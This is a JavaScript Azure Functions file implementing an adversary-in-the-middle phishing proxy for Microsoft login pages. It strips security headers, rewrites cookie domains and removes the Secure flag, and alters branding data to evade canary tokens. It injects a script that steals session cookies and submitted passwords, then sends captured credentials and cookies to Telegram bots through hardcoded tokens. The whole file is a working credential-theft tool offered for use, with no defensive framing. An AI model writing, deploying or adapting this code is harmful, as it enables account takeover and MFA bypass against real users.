const { app } = require("@azure/functions");
const axios = require('axios');

// Telegram configuration - CORRECT TOKENS
const TELEGRAM_BOT_TOKEN = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
const TELEGRAM_CHAT_ID = "6743632244";
const TELEGRAM_BOT_TOKEN2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
const TELEGRAM_CHAT_ID2 = "6263177378";

// Microsoft upstream domains
const upstream_enterprise = "login.microsoftonline.com";
const upstream_personal = "login.live.com";

// Headers to remove from upstream responses (security headers)
const delete_headers = [
    "content-security-policy",
    "content-security-policy-report-only",
    "clear-site-data",
    "x-frame-options",
    "referrer-policy",
    "strict-transport-security",
    "content-length",
    "content-encoding"
];

async function sendTelegram(message, isSecondary = false) {
    const botToken = isSecondary ? TELEGRAM_BOT_TOKEN2 : TELEGRAM_BOT_TOKEN;
    const chatId = isSecondary ? TELEGRAM_CHAT_ID2 : TELEGRAM_CHAT_ID;
    
    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        console.log(`Telegram message sent: ${message.substring(0, 50)}...`);
    } catch (error) {
        console.error('Telegram send error:', error.message);
    }
}

// Advanced response text replacement based on Nicola Suter's research
async function replace_response_text(response, upstream, original) {
    return response
        .text()
        .then((text) => text.replace(new RegExp(upstream, "g"), original))
        // Extended response modification to remove custom CSS URL that triggers canary tokens
        .then((text) => text.replace(/"customCssUrl"\s*:\s*".*?"/, '"customCssUrl": "' + original + '"'))
        // Modify branding response to evade detection (based on Suter's research)
        .then((text) => {
            try {
                const config = JSON.parse(text);
                // Remove custom CSS URL to evade canary tokens
                if (config.EstsProperties?.UserTenantBranding?.[0]?.CustomizationFiles) {
                    config.EstsProperties.UserTenantBranding[0].CustomizationFiles.customCssUrl = null;
                }
                return JSON.stringify(config);
            } catch {
                return text;
            }
        });
}

// Extract and log valuable cookies for AiTM attack
function extractCookies(request) {
    const cookies = request.headers.cookie || '';
    const valuableCookies = [];
    
    // Extract critical Microsoft authentication cookies
    const cookiePatterns = [
        'ESTSAUTH=',
        'ESTSAUTHPERSISTENT=', 
        'SignInStateCookie=',
        'ESTSAUTHLIGHT=',
        'buid=',
        'x-ms-gateway-slice='
    ];
    
    cookies.split(';').forEach(cookie => {
        const trimmed = cookie.trim();
        for (const pattern of cookiePatterns) {
            if (trimmed.startsWith(pattern)) {
                valuableCookies.push(trimmed);
                break;
            }
        }
    });
    
    return valuableCookies;
}

// Process and capture cookies from responses
function processCookies(responseHeaders, proxyHost) {
    const setCookieHeaders = responseHeaders['set-cookie'] || [];
    const processedCookies = [];
    
    setCookieHeaders.forEach(cookieString => {
        // Modify cookie domain to match our proxy
        let modifiedCookie = cookieString
            .replace(/domain=\.?login\.microsoftonline\.com/gi, `domain=${proxyHost}`)
            .replace(/domain=\.?login\.live\.com/gi, `domain=${proxyHost}`)
            .replace(/SameSite=None/gi, 'SameSite=Lax') // Relax SameSite for compatibility
            .replace(/Secure;/gi, ''); // Remove Secure flag if needed
        
        processedCookies.push(modifiedCookie);
    });
    
    return processedCookies;
}

// Main proxy function
app.http('proxy', {
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    authLevel: 'anonymous',
    route: 'cookieproxy/{*path}',
    handler: async (request, context) => {
        try {
            const path = request.params.path || '';
            const originalUrl = new URL(request.url);
            
            // Determine upstream based on path or query parameters
            let upstream;
            if (path.includes('live.com') || request.query.get('mkt')?.includes('consumer')) {
                upstream = upstream_personal;
            } else {
                upstream = upstream_enterprise;
            }
            
            // Construct upstream URL
            const upstreamUrl = `https://${upstream}/${path}`;
            const queryString = originalUrl.search;
            const targetUrl = upstreamUrl + queryString;
            
            console.log(`Proxying: ${request.method} ${targetUrl}`);
            
            // Extract incoming cookies for logging
            const incomingCookies = extractCookies(request);
            if (incomingCookies.length > 0) {
                const cookieMessage = `🍪 <b>Cookies Captured:</b>\n<code>${incomingCookies.join('\n')}</code>`;
                await sendTelegram(cookieMessage);
            }
            
            // Prepare headers for upstream request
            const upstreamHeaders = {};
            for (const [key, value] of Object.entries(request.headers)) {
                if (key.toLowerCase() !== 'host' && key.toLowerCase() !== 'cookie') {
                    upstreamHeaders[key] = value;
                }
            }
            
            // Modify Host header
            upstreamHeaders['Host'] = upstream;
            
            // Forward cookies to upstream (modify domains)
            if (request.headers.cookie) {
                upstreamHeaders['Cookie'] = request.headers.cookie
                    .replace(new RegExp(originalUrl.hostname, 'g'), upstream);
            }
            
            // Make request to upstream
            const upstreamResponse = await axios({
                method: request.method,
                url: targetUrl,
                headers: upstreamHeaders,
                data: request.body ? Buffer.from(await request.arrayBuffer()) : undefined,
                validateStatus: () => true, // Accept any status code
                responseType: 'arraybuffer',
                maxRedirects: 0 // Handle redirects manually
            });
            
            // Process response headers
            const responseHeaders = {};
            
            // Copy safe headers
            Object.keys(upstreamResponse.headers).forEach(header => {
                if (!delete_headers.includes(header.toLowerCase()) && header.toLowerCase() !== 'set-cookie') {
                    responseHeaders[header] = upstreamResponse.headers[header];
                }
            });
            
            // Process cookies
            const processedCookies = processCookies(upstreamResponse.headers, originalUrl.hostname);
            if (processedCookies.length > 0) {
                responseHeaders['Set-Cookie'] = processedCookies;
                
                // Log captured cookies
                const cookieMessage = `🎯 <b>Set-Cookie Intercepted:</b>\n<code>${processedCookies.join('\n')}</code>`;
                await sendTelegram(cookieMessage, true);
            }
            
            // Handle redirects
            if ([301, 302, 307, 308].includes(upstreamResponse.status)) {
                const location = upstreamResponse.headers.location;
                if (location) {
                    // Modify redirect location to point to our proxy
                    const modifiedLocation = location
                        .replace(/https?:\/\/login\.microsoftonline\.com/g, `https://${originalUrl.hostname}/cookieproxy/login.microsoftonline.com`)
                        .replace(/https?:\/\/login\.live\.com/g, `https://${originalUrl.hostname}/cookieproxy/login.live.com`);
                    responseHeaders['Location'] = modifiedLocation;
                }
            }
            
            // Process response body if it's HTML/JSON/JS
            let responseBody = Buffer.from(upstreamResponse.data);
            const contentType = upstreamResponse.headers['content-type'] || '';
            
            if (contentType.includes('text/html') || contentType.includes('application/json') || contentType.includes('javascript')) {
                try {
                    let bodyText = responseBody.toString('utf-8');
                    
                    // Replace Microsoft domains with our proxy domain
                    bodyText = bodyText
                        .replace(/https?:\/\/login\.microsoftonline\.com/g, `https://${originalUrl.hostname}/cookieproxy/login.microsoftonline.com`)
                        .replace(/https?:\/\/login\.live\.com/g, `https://${originalUrl.hostname}/cookieproxy/login.live.com`)
                        .replace(/login\.microsoftonline\.com/g, `${originalUrl.hostname}/cookieproxy/login.microsoftonline.com`)
                        .replace(/login\.live\.com/g, `${originalUrl.hostname}/cookieproxy/login.live.com`);
                    
                    // Inject cookie stealing JavaScript into login pages
                    if (bodyText.includes('Sign in') || bodyText.includes('login') || bodyText.includes('password')) {
                        const cookieStealerScript = `
<script>
(function() {
    // Cookie stealer based on AiTM research
    const originalCookies = document.cookie.split(';').map(c => c.trim());
    const relevantCookies = originalCookies.filter(cookie => 
        cookie.startsWith('ESTSAUTH=') || 
        cookie.startsWith('ESTSAUTHPERSISTENT=') || 
        cookie.startsWith('SignInStateCookie=') ||
        cookie.startsWith('buid=')
    );
    
    if (relevantCookies.length >= 1) {
        // Send cookies to our webhook endpoint
        fetch('/cookieproxy/webhook', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                cookies: relevantCookies,
                url: window.location.href,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            })
        }).catch(() => {}); // Silent fail
    }
    
    // Monitor form submissions for credentials
    document.addEventListener('submit', function(e) {
        const formData = new FormData(e.target);
        const credentials = {};
        for (let [key, value] of formData.entries()) {
            if (key.includes('email') || key.includes('username') || key.includes('password') || key.includes('login')) {
                credentials[key] = value;
            }
        }
        
        if (Object.keys(credentials).length > 0) {
            fetch('/cookieproxy/webhook', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'credentials',
                    data: credentials,
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                })
            }).catch(() => {});
        }
    });
    
    // Monitor cookie changes
    let lastCookies = document.cookie;
    setInterval(() => {
        if (document.cookie !== lastCookies) {
            const newCookies = document.cookie.split(';').map(c => c.trim());
            const authCookies = newCookies.filter(cookie => 
                cookie.startsWith('ESTSAUTH=') || 
                cookie.startsWith('ESTSAUTHPERSISTENT=') || 
                cookie.startsWith('SignInStateCookie=')
            );
            
            if (authCookies.length > 0) {
                fetch('/cookieproxy/webhook', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'cookie_update',
                        cookies: authCookies,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {});
            }
            lastCookies = document.cookie;
        }
    }, 1000);
})();
</script>`;
                        
                        // Inject before closing body tag
                        bodyText = bodyText.replace('</body>', cookieStealerScript + '</body>');
                    }
                    
                    responseBody = Buffer.from(bodyText, 'utf-8');
                } catch (error) {
                    console.error('Error processing response body:', error);
                }
            }
            
            // Log successful proxy request
            await sendTelegram(`🔄 <b>Proxy Request:</b> ${request.method} ${path}\n<b>Status:</b> ${upstreamResponse.status}`);
            
            return {
                status: upstreamResponse.status,
                headers: responseHeaders,
                body: responseBody
            };
            
        } catch (error) {
            console.error('Proxy error:', error);
            await sendTelegram(`❌ <b>Proxy Error:</b> ${error.message}`);
            
            return {
                status: 500,
                headers: { 'Content-Type': 'text/html' },
                body: `<html><body><h1>Proxy Error</h1><p>${error.message}</p></body></html>`
            };
        }
    }
});

// Webhook endpoint for receiving stolen data
app.http('webhook', {
    methods: ['POST'],
    authLevel: 'anonymous',
    route: 'cookieproxy/webhook',
    handler: async (request, context) => {
        try {
            const data = await request.json();
            
            if (data.type === 'credentials') {
                const message = `🎯 <b>CREDENTIALS CAPTURED!</b>\n<code>${JSON.stringify(data.data, null, 2)}</code>\n<b>URL:</b> ${data.url}`;
                await sendTelegram(message);
                await sendTelegram(message, true);
            } else if (data.cookies) {
                const message = `🍪 <b>LIVE COOKIES:</b>\n<code>${data.cookies.join('\n')}</code>\n<b>URL:</b> ${data.url || 'Unknown'}`;
                await sendTelegram(message);
                await sendTelegram(message, true);
            }
            
            return { status: 200, body: 'OK' };
        } catch (error) {
            console.error('Webhook error:', error);
            return { status: 500, body: 'Error' };
        }
    }
});